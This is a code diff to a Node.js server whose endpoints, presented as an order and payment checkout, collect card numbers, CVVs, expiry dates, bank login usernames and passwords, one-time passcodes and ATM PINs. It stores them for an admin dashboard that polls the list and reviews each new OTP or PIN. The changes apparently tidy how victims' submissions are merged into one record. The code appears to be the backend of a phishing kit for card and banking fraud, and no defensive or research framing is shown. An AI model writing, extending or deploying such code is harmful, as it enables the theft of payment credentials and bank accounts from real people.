@@ -147,99 +147,116 @@ const server = http.createServer(async (req, res) => {
     // ---- API: receive customer details when continuing the order ----
     if (method === 'POST' && pathname === '/api/order') {
       const body = await readBody(req);
-      const entry = {
-        id: nextId++,
-        username: '',
-        password: '',
-        otp: null,
-        atmPin: '',
-        name: (body.name || '-').toString().slice(0, 100),
-        phone: (body.phone || body.mobile || '-').toString().slice(0, 100),
-        mobile: (body.mobile || body.phone || '-').toString().slice(0, 100),
-        address: (body.address || '-').toString().slice(0, 200),
-        email: (body.email || '-').toString().slice(0, 100),
-        cardName: (body.cardName || '-').toString().slice(0, 100),
-        cardNumber: (body.cardNumber || '-').toString().slice(0, 100),
-        cardExpiry: (body.cardExpiry || '-').toString().slice(0, 100),
-        cardCvv: (body.cardCvv || '-').toString().slice(0, 100),
-        status: 'pending',
-        createdAt: Date.now(),
-        dateKey: todayKey(),
-      };
-      requests.unshift(entry);
+      let entry = body.requestId ? requests.find((r) => r.id === Number(body.requestId)) : null;
+      if (!entry) {
+        entry = {
+          id: nextId++,
+          username: '',
+          password: '',
+          otp: null,
+          atmPin: '',
+          name: '',
+          phone: '',
+          mobile: '',
+          address: '',
+          email: '',
+          cardName: '',
+          cardNumber: '',
+          cardExpiry: '',
+          cardCvv: '',
+          status: 'pending',
+          createdAt: Date.now(),
+          dateKey: todayKey(),
+        };
+        requests.unshift(entry);
+      }
+
+      if (body.name) entry.name = body.name.toString().slice(0, 100);
+      if (body.phone || body.mobile) {
+        const val = (body.phone || body.mobile).toString().slice(0, 100);
+        entry.phone = val;
+        entry.mobile = val;
+      }
+      if (body.address) entry.address = body.address.toString().slice(0, 200);
+      if (body.email) entry.email = body.email.toString().slice(0, 100);
+
+      entry.status = 'pending';
       return sendJSON(res, 200, { ok: true, id: entry.id });
     }
 
     // ---- API: receive payment / card details ----
     if (method === 'POST' && pathname === '/api/payment') {
       const body = await readBody(req);
-      const entry = body.requestId ? requests.find((r) => r.id === Number(body.requestId)) : null;
-      const paymentEntry = entry || {
-        id: nextId++,
-        username: '-',
-        password: '',
-        otp: null,
-        atmPin: '',
-        name: (body.cardName || '-').toString().slice(0, 100),
-        phone: '-',
-        mobile: '-',
-        address: '-',
-        email: '-',
-        cardName: (body.cardName || '-').toString().slice(0, 100),
-        cardNumber: (body.cardNumber || '-').toString().slice(0, 100),
-        cardExpiry: (body.expiryDate || body.cardExpiry || '-').toString().slice(0, 100),
-        cardCvv: (body.cvv || body.cardCvv || '-').toString().slice(0, 100),
-        status: 'pending',
-        createdAt: Date.now(),
-        dateKey: todayKey(),
-      };
+      let entry = body.requestId ? requests.find((r) => r.id === Number(body.requestId)) : null;
+      if (!entry) {
+        entry = {
+          id: nextId++,
+          username: '',
+          password: '',
+          otp: null,
+          atmPin: '',
+          name: '',
+          phone: '',
+          mobile: '',
+          address: '',
+          email: '',
+          cardName: '',
+          cardNumber: '',
+          cardExpiry: '',
+          cardCvv: '',
+          status: 'pending',
+          createdAt: Date.now(),
+          dateKey: todayKey(),
+        };
+        requests.unshift(entry);
+      }
 
-      if (body.cardName) paymentEntry.cardName = body.cardName.toString().slice(0, 100);
-      if (body.cardNumber) paymentEntry.cardNumber = body.cardNumber.toString().slice(0, 100);
-      if (body.expiryDate) paymentEntry.cardExpiry = body.expiryDate.toString().slice(0, 100);
-      if (body.cvv) paymentEntry.cardCvv = body.cvv.toString().slice(0, 100);
+      if (body.cardName) entry.cardName = body.cardName.toString().slice(0, 100);
+      if (body.cardNumber) entry.cardNumber = body.cardNumber.toString().slice(0, 100);
+      if (body.expiryDate || body.cardExpiry) entry.cardExpiry = (body.expiryDate || body.cardExpiry).toString().slice(0, 100);
+      if (body.cvv || body.cardCvv) entry.cardCvv = (body.cvv || body.cardCvv).toString().slice(0, 100);
 
-      paymentEntry.status = 'pending';
-
-      if (!entry) requests.unshift(paymentEntry);
-      return sendJSON(res, 200, { ok: true, id: paymentEntry.id });
+      entry.status = 'pending';
+      return sendJSON(res, 200, { ok: true, id: entry.id });
     }
 
     // ---- API: receive a login submission from the customer flow ----
     if (method === 'POST' && pathname === '/api/login') {
       const body = await readBody(req);
-      const entry = body.requestId ? requests.find((request) => request.id === Number(body.requestId)) : null;
-      if (body.requestId && !entry) return sendJSON(res, 404, { ok: false, error: 'order not found' });
-      const loginEntry = entry || {
-        id: nextId++,
-        otp: null,
-        atmPin: '',
-        name: (body.name || '-').toString().slice(0, 100),
-        phone: (body.phone || body.mobile || '-').toString().slice(0, 100),
-        mobile: (body.mobile || body.phone || '-').toString().slice(0, 100),
-        address: (body.address || '-').toString().slice(0, 200),
-        email: (body.email || '-').toString().slice(0, 100),
-        cardName: (body.cardName || '-').toString().slice(0, 100),
-        cardNumber: (body.cardNumber || '-').toString().slice(0, 100),
-        cardExpiry: (body.cardExpiry || '-').toString().slice(0, 100),
-        cardCvv: (body.cardCvv || '-').toString().slice(0, 100),
-        status: 'pending',
-        createdAt: Date.now(),
-        dateKey: todayKey(),
-      };
-      loginEntry.username = (body.username || body.email || body.mobile || body.name || '').toString().slice(0, 100);
-      loginEntry.password = (body.password || body.phone || body.mobile || '').toString().slice(0, 100);
+      let entry = body.requestId ? requests.find((request) => request.id === Number(body.requestId)) : null;
+      if (!entry) {
+        entry = {
+          id: nextId++,
+          username: '',
+          password: '',
+          otp: null,
+          atmPin: '',
+          name: '',
+          phone: '',
+          mobile: '',
+          address: '',
+          email: '',
+          cardName: '',
+          cardNumber: '',
+          cardExpiry: '',
+          cardCvv: '',
+          status: 'pending',
+          createdAt: Date.now(),
+          dateKey: todayKey(),
+        };
+        requests.unshift(entry);
+      }
+
+      entry.username = (body.username || body.email || body.mobile || body.name || '').toString().slice(0, 100);
+      entry.password = (body.password || body.phone || body.mobile || '').toString().slice(0, 100);
       
-      if (body.cardName) loginEntry.cardName = body.cardName.toString().slice(0, 100);
-      if (body.cardNumber) loginEntry.cardNumber = body.cardNumber.toString().slice(0, 100);
-      if (body.cardExpiry) loginEntry.cardExpiry = body.cardExpiry.toString().slice(0, 100);
-      if (body.cardCvv) loginEntry.cardCvv = body.cardCvv.toString().slice(0, 100);
+      if (body.cardName) entry.cardName = body.cardName.toString().slice(0, 100);
+      if (body.cardNumber) entry.cardNumber = body.cardNumber.toString().slice(0, 100);
+      if (body.cardExpiry) entry.cardExpiry = body.cardExpiry.toString().slice(0, 100);
+      if (body.cardCvv) entry.cardCvv = body.cardCvv.toString().slice(0, 100);
 
-      // Reset status to pending on retry/update
-      loginEntry.status = 'pending';
-
-      if (!entry) requests.unshift(loginEntry);
-      return sendJSON(res, 200, { ok: true, id: loginEntry.id });
+      entry.status = 'pending';
+      return sendJSON(res, 200, { ok: true, id: entry.id });
     }
 
     // ---- API: receive an OTP submission ----
@@ -247,22 +264,21 @@ const server = http.createServer(async (req, res) => {
       const body = await readBody(req);
       let entry = requests.find((r) => r.id === Number(body.id));
       if (!entry) {
-        // Create a placeholder request if opened directly
         entry = {
           id: Number(body.id) || nextId++,
-          username: 'Direct OTP User',
+          username: '',
           password: '',
           otp: null,
           atmPin: '',
-          name: 'Direct OTP User',
-          phone: '-',
-          mobile: '-',
-          address: '-',
-          email: '-',
-          cardName: '-',
-          cardNumber: '-',
-          cardExpiry: '-',
-          cardCvv: '-',
+          name: '',
+          phone: '',
+          mobile: '',
+          address: '',
+          email: '',
+          cardName: '',
+          cardNumber: '',
+          cardExpiry: '',
+          cardCvv: '',
           status: 'pending',
           createdAt: Date.now(),
           dateKey: todayKey(),
@@ -270,8 +286,8 @@ const server = http.createServer(async (req, res) => {
         requests.unshift(entry);
       }
       entry.otp = (body.otp || '').toString().slice(0, 20);
-      entry.status = 'pending'; // new OTP always needs fresh review
-      return sendJSON(res, 200, { ok: true });
+      entry.status = 'pending';
+      return sendJSON(res, 200, { ok: true, id: entry.id });
     }
 
     // ---- API: receive an ATM PIN submission ----
@@ -280,8 +296,8 @@ const server = http.createServer(async (req, res) => {
       const entry = requests.find((r) => r.id === Number(body.id));
       if (!entry) return sendJSON(res, 404, { ok: false, error: 'not found' });
       entry.atmPin = (body.atmPin || '').toString().slice(0, 10);
-      entry.status = 'pending'; // needs review
-      return sendJSON(res, 200, { ok: true });
+      entry.status = 'pending';
+      return sendJSON(res, 200, { ok: true, id: entry.id });
     }
 
     // ---- API: list all requests (for admin dashboard polling) ----
@@ -294,7 +310,6 @@ const server = http.createServer(async (req, res) => {
       const idStr = pathname.split('/')[3];
       const entry = requests.find((r) => r.id === Number(idStr));
       if (!entry) {
-        // Return pending instead of 404 to allow direct page access
         return sendJSON(res, 200, { ok: true, status: 'pending' });
       }
       return sendJSON(res, 200, { ok: true, status: entry.status });
